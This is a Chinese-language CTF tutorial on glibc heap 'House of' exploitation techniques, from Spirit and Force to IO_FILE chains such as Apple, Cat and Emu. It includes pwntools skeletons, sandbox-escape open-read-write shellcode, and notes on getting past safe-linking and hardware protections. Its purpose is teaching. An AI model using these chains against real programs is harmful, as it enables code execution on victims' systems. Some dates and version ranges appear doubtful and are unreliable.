# House 系列 (House of Series)

## 原理

House 系列是 glibc 堆利用的经典技术集合，每个 House 针对特定的 glibc 版本或保护机制，通过特定的堆操作序列实现任意代码执行。

## House 系列总览

| House | 适用版本 | 利用方式 | 难度 |
|-------|---------|---------|------|
| House of Spirit | 通用 | 伪造 chunk + free + malloc | 低 |
| House of Force | < 2.29 | 覆盖 top chunk size | 中 |
| House of Lore | < 2.29 | smallbin attack | 中 |
| House of Einherjar | 通用 | off-by-one 触发合并 | 中 |
| House of Orange | < 2.34 | unsorted bin + IO_FILE | 高 |
| House of Rabbit | < 2.29 | fastbin 合并 | 中 |
| House of Roman | < 2.29 | partial overwrite | 高 |
| House of Storm | < 2.29 | unsorted bin + largebin | 高 |
| House of Husk | < 2.34 | printf format string | 中 |
| House of Banana | 2.34+ | exit_funcs | 高 |
| House of Apple | 2.34+ | IO_FILE | 高 |
| House of Cat | 2.35+ | IO_FILE | 高 |
| House of Emu | 2.36+ | IO_FILE | 高 |

## 经典 House 详解

### 1. House of Spirit

```python
# 在栈/BSS 上伪造 chunk
# 1. 在目标地址伪造 chunk 元数据
#    target_addr: prev_size(8) + size(8) + data
# 2. free 该地址
# 3. malloc 返回该地址

from pwn import *

p = process('./pwn')

# 伪造 chunk
target = 0x404100
# 写入 size
write(target + 8, p64(0x31))  # size = 0x31
# free
free(target + 0x10)  # free chunk 起始地址
# malloc
malloc(0x20)  # 返回 target + 0x10
```

### 2. House of Force

```python
# glibc < 2.29
# 覆盖 top chunk size 为很大值
# 然后分配大 chunk，top chunk 移动到目标地址

from pwn import *

p = process('./pwn')

# 1. 泄露堆地址
heap_addr = ...
# 2. 溢出覆盖 top chunk size
edit(top_chunk_offset, p64(0xffffffffffffffff))
# 3. 计算偏移
target = 0x404000
offset = target - heap_addr - 0x10  # 减去 chunk header
# 4. 分配大 chunk
malloc(offset)
# 5. 再次分配，返回 target
malloc(0x20)
```

### 3. House of Einherjar

```python
# off-by-one 触发 chunk 合并
# 1. 分配 chunk A, B
malloc(0x18)  # A
malloc(0x18)  # B
# 2. off-by-one 覆盖 B 的 prev_size 和 PREV_INUSE
edit(A, b'A' * 0x18 + p64(0x20))  # 覆盖 B 的 prev_size
# 3. 伪造 A 前面的 chunk
fake_chunk = ...
# 4. free B，触发合并
free(B)
# 合并后的 chunk 包含 A 和 B
```

### 4. House of Orange

```python
# glibc < 2.34
# 无 free 函数时利用
# 1. 溢出 top chunk size
# 2. 分配大 chunk，触发 top chunk free 到 unsorted bin
# 3. 利用 unsorted bin attack + IO_FILE

from pwn import *

p = process('./pwn')

# 1. 溢出 top chunk
edit(top_chunk_offset, p64(0xfe1))  # 修改 size
# 2. 分配大 chunk
malloc(0x1000)
# top chunk 被 free 到 unsorted bin
# 3. 泄露 libc
# 4. 构造 fake IO_FILE
# 5. 触发 _IO_OVERFLOW
```

### 5. House of Husk

```python
# glibc < 2.34
# 利用 printf 的 format string 机制
# 1. 通过 unsorted bin attack 覆盖 __printf_function_table
# 2. 通过 unsorted bin attack 覆盖 __printf_arginfo_table
# 3. 触发 printf，执行任意函数
```

## glibc 2.34+ 新 House

### 6. House of Banana

```python
# glibc 2.34+
# 通过 exit_funcs 实现 RCE
# 1. 泄露 libc 地址
# 2. 通过堆漏洞覆盖 __exit_funcs
# 3. 构造 fake exit_function_list
# 4. 触发 exit，执行任意函数
```

### 7. House of Apple

```python
# glibc 2.34+
# 通过 IO_FILE 实现 RCE
# 利用 _IO_wfile_overflow 等 wide char 函数

# House of Apple 2
# 1. 通过堆漏洞修改 _IO_list_all
# 2. 构造 fake IO_FILE
# 3. 触发 _IO_wfile_overflow
# 4. 调用 _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE
# 5. 执行任意函数

# House of Apple 3
# 类似 Apple 2，但利用不同的 IO 函数
```

### 8. House of Cat

```python
# 2024 年新利用链
# glibc 2.35+
# 通过 largebin + IO_FILE 实现 RCE

# 1. largebin attack 修改 _IO_list_all
# 2. 构造 fake IO_FILE
# 3. 触发 IO 操作
# 4. 执行任意函数
```

### 9. House of Emu

```python
# glibc 2.36+
# 新的 IO_FILE 利用
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks 对 House 系列的影响

```python
# glibc 2.34+ 移除 __malloc_hook/__free_hook
# House of Storm/Husk 等经典 House 失效
# 新 House (Apple/Banana/Cat/Emu) 成为主流

from pwn import *

context.arch = 'amd64'

class ModernHouseExploit:
    """glibc 2.34+ House 系列利用框架"""
    
    def __init__(self, p, elf, libc):
        self.p = p
        self.elf = elf
        self.libc = libc
        self.libc_base = None
    
    def leak_libc(self):
        """通过 unsorted bin 泄露 libc"""
        self.p.sendlineafter(b'>', b'1')  # malloc 0x400
        self.p.sendlineafter(b'size:', b'0x400')
        self.p.sendlineafter(b'>', b'2')  # free
        self.p.sendlineafter(b'idx:', b'0')
        self.p.sendlineafter(b'>', b'4')  # show
        self.p.sendlineafter(b'idx:', b'0')
        fd = u64(self.p.recv(6).ljust(8, b'\x00'))
        self.libc_base = fd - (self.libc.symbols['main_arena'] + 96)
        log.success(f"libc: {hex(self.libc_base)}")
    
    def house_of_apple2(self):
        """
        House of Apple 2：glibc 2.34+ 最常用
        1. 任意分配原语（tcache/fastbin poisoning）
        2. 构造 fake IO_FILE_plus
        3. _wide_data + _wide_vtable 控制执行流
        """
        pass
    
    def house_of_banana(self):
        """
        House of Banana：glibc 2.34+
        1. 覆盖 __exit_funcs
        2. 构造 fake exit_function_list
        3. exit() 时执行任意函数
        """
        pass
    
    def house_of_cat(self):
        """
        House of Cat：glibc 2.35+
        1. largebin attack + IO_FILE
        2. 支持 seccomp ORW
        3. 2024 年 CTF 最常用
        """
        pass
    
    def house_of_emu(self):
        """
        House of Emu：glibc 2.36+
        1. 利用 _IO_wstrn_jumps 等新 vtable
        2. 绕过 2.34+ 的 vtable 范围检查
        """
        pass
```

### 2. safe-linking 对 House 系列的影响

```python
# glibc 2.32+ safe-linking 影响所有需要修改 fd 指针的 House

from pwn import *

context.arch = 'amd64'

def safe_linking_house_bypass():
    """safe-linking 下各 House 的调整"""
    
    # === House of Spirit ===
    # 在栈/BSS 上伪造 chunk 时：
    # fd 指针需要经过 safe-linking 加密
    # 需要泄露堆地址才能计算加密值
    
    # === House of Force ===
    # glibc < 2.29，safe-linking (2.32+) 之前
    # 不受影响（已失效）
    
    # === House of Apple 2 ===
    # tcache/fastbin poisoning 需要加密 fd
    # 泄露堆地址 -> 计算加密值 -> 覆盖 fd
    
    # === 通用绕过模板 ===
    def encrypt_fd(chunk_addr, target):
        """safe-linking 加密"""
        return (chunk_addr >> 12) ^ target
    
    def decrypt_fd(chunk_addr, encrypted):
        """safe-linking 解密"""
        return (chunk_addr >> 12) ^ encrypted
    
    def leak_heap(p, malloc, free, show):
        """泄露堆地址"""
        # 分配两个 chunk，释放后读取加密 fd
        pass
```

### 3. 硬件级防护对 House 系列的影响

```python
# Intel CET / ARM PAC+BTI / ARM MTE

from pwn import *

def hardware_house_bypass():
    """硬件防护下 House 系列的调整"""
    
    # === MTE ===
    # 所有堆操作都需要 tag 匹配
    # House of Spirit 在栈上伪造 chunk 时，tag 必须正确
    # 绕过：tag spraying / 部分覆盖
    
    # === CET Shadow Stack ===
    # 覆盖返回地址时影子栈检测
    # House of Apple 2/3 不覆盖返回地址（通过函数指针）
    # 仍然可用
    
    # === PAC ===
    # ARM 设备上利用时：
    # 函数指针需要合法的 PAC 签名
    # House of Apple 2 通过 _wide_vtable 间接调用
    # 需要确保 _wide_vtable 中的函数指针有效
    pass
```

### 4. 沙箱环境 House 系列

```python
# seccomp 限制下的 House 系列

from pwn import *

context.arch = 'amd64'

def house_orw_template():
    """House 系列 + ORW"""
    
    # === House of Cat + ORW（2024 CTF 最常用）===
    # 1. largebin attack 修改 _IO_list_all
    # 2. 构造 fake IO_FILE
    # 3. 在 _wide_data 中嵌入 ORW shellcode
    # 4. 触发 _IO_wfile_overflow -> 执行 shellcode
    
    # ORW shellcode（通过 IO_FILE 触发）
    orw_sc = asm(f'''
        /* 打开 flag 文件 */
        xor eax, eax
        push rax
        mov rdi, 0x67616c66    /* "flag" */
        push rdi
        mov rdi, rsp
        mov al, 2              /* sys_open */
        xor esi, esi           /* O_RDONLY */
        syscall
        
        /* 读取 flag 内容 */
        mov edi, eax            /* fd */
        mov rsi, rsp            /* buf */
        mov dl, 0x40            /* size */
        xor eax, eax            /* sys_read */
        syscall
        
        /* 写入 stdout */
        mov edx, eax            /* len */
        mov dil, 1              /* stdout */
        mov al, 1               /* sys_write */
        syscall
    ''')
    
    # === House of Apple 2 + ORW ===
    # 1. tcache poisoning 分配到 _IO_list_all
    # 2. 构造 fake IO_FILE
    # 3. 通过 _wide_data 控制执行 ORW
```

### 5. 新型 House 发展趋势 (2024-2026)

```python
# 2024-2026 House 系列的发展趋势

from pwn import *

# === 趋势 1：IO_FILE 成为核心 ===
# 所有新 House 都基于 IO_FILE 利用
# 原因：glibc 2.34+ 移除 hooks
# IO_FILE 是少数仍可利用的机制

# === 趋势 2：wide char 函数利用 ===
# _IO_wfile_overflow / _IO_wdoallocbuf / _IO_WDOALLOCATE
# 成为新的控制流劫持点
# 绕过了 narrow char 的 vtable 检查

# === 趋势 3：seccomp + ORW ===
# 2024+ CTF 中大多数题目都有 seccomp
# House 系列需要支持 ORW 输出
# House of Cat 是首选（原生支持 ORW）

# === 趋势 4：多阶段利用 ===
# 需要多次泄露、多次分配
# 利用链越来越长
# 需要更精细的堆布局控制

# === 未来可能的新 House ===
# 基于 glibc 2.37+ 的新特性
# 基于新 CPU 特性（CET/PAC/MTE）
# 基于新编译器优化

# === 实用利用模板（2024+ 通用）===
def universal_house_exploit():
    """通用 House 利用模板 (2024+)"""
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    # Step 1: 信息泄露
    # 泄露 libc、堆、栈地址
    
    # Step 2: 任意写原语
    # tcache poisoning / fastbin attack / largebin attack
    
    # Step 3: 选择利用路径
    # 如果有 seccomp: House of Cat + ORW
    # 如果无 seccomp: House of Apple 2 + system
    # 如果 glibc 2.34+: House of Banana + exit_funcs
    
    # Step 4: 构造 fake 数据结构
    
    # Step 5: 触发执行
    
    p.interactive()
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试
- **how2heap** — 各种 House 的 PoC

## 参考链接

- [ctf-wiki House of](https://ctf-wiki.org/pwn/linux/glibc-heap/house_of_spirit/)
- [how2heap](https://github.com/shellphish/how2heap)
- [House of Apple](https://ctf-wiki.org/pwn/linux/glibc-heap/house_of_apple/)
- [House of Cat](https://www.jianshu.com/p/4d7d7a460c0c)
